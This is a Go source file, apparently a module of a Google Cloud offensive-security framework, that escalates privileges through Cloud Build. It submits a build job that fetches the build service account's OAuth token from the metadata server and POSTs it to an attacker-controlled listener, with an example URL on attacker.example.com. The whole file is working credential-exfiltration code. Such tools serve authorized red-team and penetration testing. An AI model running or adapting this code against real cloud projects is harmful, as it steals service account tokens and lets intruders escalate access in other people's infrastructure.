package cloudbuild

import (
	"context"
	"fmt"

	cloudbuildv1 "google.golang.org/api/cloudbuild/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateBuild{})
}

// EscalateBuild creates a Cloud Build job that exfiltrates the build service account token.
type EscalateBuild struct{}

func (m *EscalateBuild) Info() module.Info {
	return module.Info{
		Name:         "privesc.cloudbuild.escalate-build",
		Tactic:       module.TacticPrivesc,
		Service:      "cloudbuild",
		Description:  "Create a Cloud Build job to exfiltrate the build SA token via metadata server",
		RequiresAuth: true,
		AttackID:     "T1648",
	}
}

func (m *EscalateBuild) Run(ctx module.RunContext) error {
	listener := ctx.Flags["listener"]
	if listener == "" {
		output.Warn("Usage: run privesc.cloudbuild.escalate-build --listener <attacker-url>")
		output.Info("The listener URL will receive a POST with the build SA OAuth token.")
		output.Info("Example: --listener https://attacker.example.com/token")
		return nil
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := cloudbuildv1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create cloudbuild client: %w", err)
	}

	metadataURL := "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

	build := &cloudbuildv1.Build{
		Steps: []*cloudbuildv1.BuildStep{
			{
				Name: "gcr.io/cloud-builders/curl",
				Args: []string{
					"-s",
					"-H", "Metadata-Flavor: Google",
					"-o", "/workspace/token.json",
					metadataURL,
				},
			},
			{
				Name: "gcr.io/cloud-builders/curl",
				Args: []string{
					"-s",
					"-X", "POST",
					"-d", "@/workspace/token.json",
					listener,
				},
			},
		},
	}

	output.Info("Submitting Cloud Build job in project %s", project)
	output.Info("Step 1: Fetch SA token from metadata server")
	output.Info("Step 2: POST token to %s", listener)

	op, err := svc.Projects.Builds.Create(project, build).Do()
	if err != nil {
		return fmt.Errorf("create build: %w", err)
	}

	output.Success("Build submitted: %s", op.Name)
	if op.Metadata != nil {
		output.Info("Build metadata: %v", string(op.Metadata))
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.cloudbuild.escalate-build",
			Severity:    module.SevCritical,
			Title:       "Cloud Build job created to exfiltrate SA token",
			Description: fmt.Sprintf("Submitted build in project %s that exfiltrates the Cloud Build SA token to %s", project, listener),
			Resource:    project,
			Project:     project,
			Data:        map[string]any{"listener": listener},
		}
	}

	return nil
}
